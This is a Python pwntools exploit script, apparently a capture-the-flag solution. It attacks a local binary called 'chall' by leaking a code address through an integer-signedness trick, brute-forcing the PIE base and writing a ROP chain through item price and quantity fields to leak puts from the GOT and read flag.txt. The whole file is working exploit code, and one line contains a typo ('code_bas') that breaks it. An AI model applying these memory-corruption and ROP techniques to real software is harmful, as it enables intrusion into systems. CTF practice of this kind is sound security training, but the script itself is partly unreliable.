def guess_leak(leak):
	code_base = 0x557f # bruteforce using upper bytes of a possible code address i.e 0x557f
	lower_bytes = (leak // code_base) & 0xfffff
	while(lower_bytes != 0x00b6c):
		leak += 0x100000000 # add to msb
		lower_bytes = (leak // code_base) & 0xfffff
		#print(lower_bytes)
		if(leak > (0xffff00000000 + 1)):
			return -1
	val = (0x557f << 32) # 0x557f00000000
	val += leak // code_base
	val -= 0x6bc
	
	return val

def fun(p):
	
	p.sendline('0x2000000000000000')

	p.recvuntil('$')

	# since total is a signed value, changing it to an unsigned integer.
	leak = int(p.recvline()[:-1]) & 0xffffffff

	code_base = guess_leak(leak)

	if(code_base & 0xfff == 0):
		info('invalid address')
		p.close()
	info('code_base: %s'%hex(code_base))
	
	puts_plt = code_base + 0x7e0
	puts_got = code_bas + 0x201f90
	main = code_base + 0xaad
	ret = code_base + 0x00000000000007be

	pop_rdi = code_base + 0x0000000000000d53

	pay = p64(pop_rdi)
	pay += p64(puts_got)
	pay += p64(puts_plt)
	pay += p64(main)
	pay += p64(ret)

	p.sendlineafter('1=Yes] ', str(1))

	for i in range(len(pay)):
		p.sendlineafter('Index to modify (-1 to quit): ', str(i + 11))
		p.sendlineafter('  Price: $', str(pay[i] & 0xffffffff))
		p.sendlineafter('  Quantity: ', str(pay[i] >> 32))
	

	p.sendlineafter('Index to modify (-1 to quit): ', '-1')

	p.recvlines(2)
	p.sendline('cat flag.txt')
	
	p.interactive()

if __name__ == "__main__":
	from pwn import *

	context.log_level="debug"
	while(1):

		p = process('./chall', env={'LD_PRELOAD':'./libc-2.31.so'})
		#gdb.attach(p, gdbscript='b*calc_total\nc\n')
		try:
			fun(p)
		
		except:
			p.close()
